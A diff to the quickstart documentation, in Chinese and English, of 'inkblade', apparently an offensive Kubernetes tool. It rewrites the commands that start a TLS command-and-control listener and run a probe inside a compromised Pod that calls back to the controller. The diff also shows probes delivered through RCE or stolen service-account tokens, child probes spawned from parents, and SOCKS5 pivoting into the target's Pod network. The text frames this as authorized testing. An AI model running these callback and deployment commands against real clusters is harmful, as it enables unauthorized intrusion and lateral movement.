@@ -50,17 +50,25 @@ inkblade quickstart
 默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。探针主动回连控制端，不需要在 Pod 上开监听端口。
 
 ```bash
-inkblade probe list
-inkblade channel listen
+inkblade channel listen \
+  --bind 0.0.0.0 --port 9443 \
+  --transport tls \
+  --token-file ./probe.token \
+  --workspace local-lab
 ```
 
-控制端用 `channel listen` 等待连接；在 Pod 内让探针回连：
+`channel listen` 首次运行会生成 `ca.pem`、`server.pem`、`server-key.pem` 与叶证书 SHA-256 pin，并输出探针命令。把 `ca.pem` 和 token 文件按你的投放方式送进 Pod（token 不要走明文日志），在 Pod 内让探针主动回连：
 
 ```bash
-inkblade-probe reverse --host <controller> --port <port>
+./inkblade-probe reverse \
+  --transport tls \
+  --host <controller> --port 9443 \
+  --ca-file ca.pem --pin <sha256> --sni <name> \
+  --token-file /tmp/probe.token \
+  --probe-id pod-a
 ```
 
-`probe list` 列出工作区里已登记的探针（`probe_id`、父探针、状态、目标）。子探针由父探针用 `probe upload` + `probe spawn` 投放，并以同样方式回连。存在本地命令通道时仍可使用 stdio 通道（`inkblade channel start --session <session-id>`），但默认路径不依赖它。通道只在本地回环暴露 SOCKS5 与端口转发，用于访问目标 Pod 网络内的服务。
+`tls` 是默认传输；也可选择 `--transport wss --path /ws` 或 `--transport https`，三者都是加密传输，管理同一个 framed RPC。`probe list` 列出已登记探针（`probe_id`、父探针、传输、状态、目标）。子探针由父探针用 `probe upload` + `probe spawn` 投放，并以同样方式回连。存在本地命令通道时仍可使用 stdio 通道（`inkblade channel start --session <session-id>`），但默认路径不依赖它。通道只在本地回环暴露 SOCKS5 与端口转发，用于访问目标 Pod 网络内的服务。
 
 ## 4. 首次投放（无需 kubeconfig）
 
@@ -87,7 +95,12 @@ inkblade probe deploy \
 随后在 Pod 内启动探针回连：
 
 ```bash
-inkblade-probe reverse --host <controller> --port <port>
+./inkblade-probe reverse \
+  --transport tls \
+  --host <controller> --port 9443 \
+  --ca-file ca.pem --pin <sha256> --sni <name> \
+  --token-file /tmp/probe.token \
+  --probe-id pod-a
 ```
 
 - `--credential-source` 可取 `pod-shell`、`sa-token` 或 `rce`。
@@ -196,10 +209,19 @@ Open `127.0.0.1:8765`, sign in as `admin` with the one-time password, and sign t
 Existing probe: the controller listens and the probe connects back.
 
 ```bash
+inkblade channel listen \
+  --bind 0.0.0.0 --port 9443 \
+  --transport tls \
+  --token-file ./probe.token \
+  --workspace local-lab
+# in the Pod (copy ca.pem and the token through your authorized foothold):
+./inkblade-probe reverse \
+  --transport tls \
+  --host <controller> --port 9443 \
+  --ca-file ca.pem --pin <sha256> --sni <name> \
+  --token-file /tmp/probe.token \
+  --probe-id pod-a
 inkblade probe list
-inkblade channel listen
-# in the Pod:
-inkblade-probe reverse --host <controller> --port <port>
 ```
 
 First delivery from a least-privilege foothold (no kubeconfig):
@@ -210,7 +232,12 @@ inkblade session open --mode foothold --target <target> \
 inkblade probe deploy --session <session-id> --via rce \
   --binary ./inkblade-probe-linux-amd64 \
   --probe-token-file ./probe.token --allow-write
-inkblade-probe reverse --host <controller> --port <port>
+./inkblade-probe reverse \
+  --transport tls \
+  --host <controller> --port 9443 \
+  --ca-file ca.pem --pin <sha256> --sni <name> \
+  --token-file /tmp/probe.token \
+  --probe-id pod-a
 ```
 
 Child probes are delivered from the parent with `probe upload` + `probe spawn` and call back the controller the same way. A stdio channel (`channel start --session <id>`) remains available when a local command transport exists.
